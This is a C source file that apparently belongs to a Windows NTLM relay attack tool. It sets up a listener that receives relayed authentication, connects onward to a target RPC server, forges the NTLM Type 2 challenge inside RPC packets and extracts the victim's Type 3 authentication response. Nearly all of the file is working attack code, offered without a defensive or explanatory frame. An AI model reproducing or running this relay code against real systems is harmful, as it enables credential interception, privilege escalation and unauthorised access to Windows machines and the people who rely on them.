#define WIN32_LEAN_AND_MEAN

#include "Windows.h"
#include "stdio.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include "RelayLib.h"

#pragma comment (lib, "Ws2_32.lib")

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

SOCKET CreateRPCSocketListen(const wchar_t* listenport) {
	WSADATA wsaData;
	int iResult;
	char listen_port_a[12];

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(-1);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(listen_port_a, 0, 12);
	wcstombs(listen_port_a, listenport, 12);

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, listen_port_a, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(-1);
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(-1);
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	freeaddrinfo(result);

	printf("[*] RPC relay server listening on port %S ...\n", listenport);
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	// Accept a client socket
	ClientSocket = accept(ListenSocket, (sockaddr*)NULL, (int*)NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}
	printf("[+] Received the relayed authentication on the RPC relay server on port %S\n", listenport);
	// No longer need server socket
	closesocket(ListenSocket);
	return ClientSocket;
}

SOCKET CreateRPCSocketReflect(const wchar_t* remoteRPCIp, const wchar_t* remoteRPCport) {
	//----------------------
	// Initialize Winsock

	char remoteRPCIp_a[20];
	char remoteRPCport_a[12];
	int remotePort;
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}
	//----------------------
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	memset(remoteRPCport_a, 0, 12);
	wcstombs(remoteRPCport_a, remoteRPCport, 12);
	memset(remoteRPCIp_a, 0, 20);
	wcstombs(remoteRPCIp_a, remoteRPCIp, 20);
	remotePort = atoi(remoteRPCport_a);
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(remoteRPCIp_a);
	clientService.sin_port = htons(remotePort);

	//----------------------
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)& clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"CreateRPCSocketReflect: connect function failed with error: %ld\n", WSAGetLastError());
		printf("Couldn't connect to RPC Server %S on port %S\n", remoteRPCIp, remoteRPCport);
		iResult = closesocket(ConnectSocket);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("[*] Connected to RPC Server %S on port %S\n", remoteRPCIp, remoteRPCport);
	return ConnectSocket;
}

void ForgeAndAlterType2Rpc(char* rpcType2Packet, int rpcType2PacketLen, int authIndexStart, char* ntlmType2, int ntlmType2Len, char* newRpcType2Packet) {
	short* fragLen = (short*)rpcType2Packet + 4;
	short* authLen = (short*)rpcType2Packet + 5;
	int ntlmPacketLen = rpcType2PacketLen - authIndexStart;
	*fragLen = *fragLen - ntlmPacketLen + ntlmType2Len;
	*authLen = ntlmType2Len;
	memcpy(newRpcType2Packet, rpcType2Packet, authIndexStart);
	memcpy(newRpcType2Packet + authIndexStart, ntlmType2, ntlmType2Len);
}

void ExtractType3FromRpc(char* rpcPacket, int rpcPacketLen, char* ntlmType3, int* ntlmType3Len) {
	int ntlmIndex = findNTLMBytes(rpcPacket, rpcPacketLen);
	short* authLen = (short*)rpcPacket + 5;
	memcpy(ntlmType3, rpcPacket + ntlmIndex, *authLen);
	*ntlmType3Len = (int)* authLen;
}

int findNTLMBytes(char* bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

//debug
void hexDump2(char* desc, void* addr, int len) {
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		return;
	}
	if (len < 0) {
		printf("  NEGATIVE LENGTH: %i\n", len);
		return;
	}

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}
